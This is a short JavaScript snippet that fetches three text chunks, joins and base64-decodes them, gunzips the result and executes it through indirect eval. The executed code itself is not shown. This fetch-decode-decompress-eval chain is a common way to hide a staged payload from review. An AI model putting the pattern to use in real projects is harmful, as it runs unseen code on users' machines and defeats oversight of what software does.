(async function(){
  const parts=await Promise.all([fetch('c0.txt').then(r=>r.text()),fetch('c1.txt').then(r=>r.text()),fetch('c2.txt').then(r=>r.text())]);
  const bin=Uint8Array.from(atob(parts.join('')),c=>c.charCodeAt(0));
  const ds=new DecompressionStream('gzip');
  const stream=new Blob([bin]).stream().pipeThrough(ds);
  const buf=await new Response(stream).arrayBuffer();
  (0,eval)(new TextDecoder().decode(buf));
})();
